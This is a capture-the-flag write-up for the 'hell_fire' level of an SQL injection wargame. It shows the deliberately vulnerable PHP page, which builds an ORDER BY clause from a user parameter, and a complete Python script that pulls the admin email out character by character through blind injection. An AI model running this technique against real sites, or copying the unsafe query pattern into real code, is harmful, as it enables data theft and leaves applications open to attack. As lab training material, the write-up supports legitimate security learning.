# hell_fire

```php
 <?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|proc|union/i', $_GET[order])) exit("No Hack ~_~");
  $query = "select id,email,score from prob_hell_fire where 1 order by {$_GET[order]}";
  echo "<table border=1><tr><th>id</th><th>email</th><th>score</th>";
  $rows = mysqli_query($db,$query);
  while(($result = mysqli_fetch_array($rows))){
    if($result['id'] == "admin") $result['email'] = "**************";
    echo "<tr><td>{$result[id]}</td><td>{$result[email]}</td><td>{$result[score]}</td></tr>";
  }
  echo "</table><hr>query : <strong>{$query}</strong><hr>";

  $_GET[email] = addslashes($_GET[email]);
  $query = "select email from prob_hell_fire where id='admin' and email='{$_GET[email]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['email']) && ($result['email'] === $_GET['email'])) solve("hell_fire");
  highlight_file(__FILE__);
?>
```

Here they are giving as a table as a whole. We have to find the admins email. so we are changing the order of the selection when the character is correct and doing a blind injection using that. So we wrote a script for that.

```python
from string import printable
import requests

session = requests.Session()
cookies = {"PHPSESSID": "7u0j9i54re004lunk8qhtjqkh9"}

url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php?order=(select case when (id='admin' and length(email)={}) then 1 else 3 end)--+"
for i in range(200):
    r = requests.get(url.format(i), cookies=cookies)
    print(i, end='\r')
    if('admin' in r.text[:76]):
        l = i
        break
print("Length :", l)
url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php?order=(select case when (id='admin' and ord(substr(email,{},1))={}) then 1 else 3 end)--+"
pw = ""
for j in range(1,l+1):
    for i in printable:
        r = requests.get(url.format(j,ord(i)), cookies=cookies)
        if('admin' in r.text[:76]):
            pw += i
            print("Password : {}".format(pw), end='\r')
            break
print("Password :", pw)

```

This will give the admins email
